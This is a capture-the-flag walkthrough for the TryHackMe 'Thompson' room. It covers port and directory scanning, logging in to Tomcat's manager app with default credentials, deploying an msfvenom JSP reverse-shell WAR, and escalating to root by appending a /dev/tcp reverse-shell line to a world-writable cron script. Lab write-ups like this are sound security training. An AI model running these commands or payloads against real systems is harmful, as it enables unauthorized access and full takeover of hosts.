# Thompson

**Room Link:** [https://tryhackme.com/room/bsidesgtthompson](https://tryhackme.com/room/bsidesgtthompson)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



### TCP/8080 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```





**Tomcat default passwords**

```
password   
Password1 
password1 
admin     
tomcat    
tomcat    
manager   
role1     
tomcat    
changethis
Password1 
changethis
password  
password1 
r00t      
root      
toor      
tomcat   
s3cret    
password1 
password  
admin     
changethis
```

I clicked manager app and tried some default credentials&#x20;

<figure><img src="../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>



```
Username: tomcat
Password: s3cret
```

<figure><img src="../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>



**Kali**

<pre><code><strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=1337 -f war > rshell.war
</strong>nc -lvnp 1337
</code></pre>

<figure><img src="../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

There is a script run by root in jacks folder

**Victim**

```
cat /etc/crontab
```

<figure><img src="../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

The script is writable by everyone so I added a the below line to reach back to my kali.

<figure><img src="../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
echo 'sh -i >& /dev/tcp/10.10.165.185/1338 0>&1' >> id.sh
```

**Kali**

<pre><code><strong>nc -lvnp 1338
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>





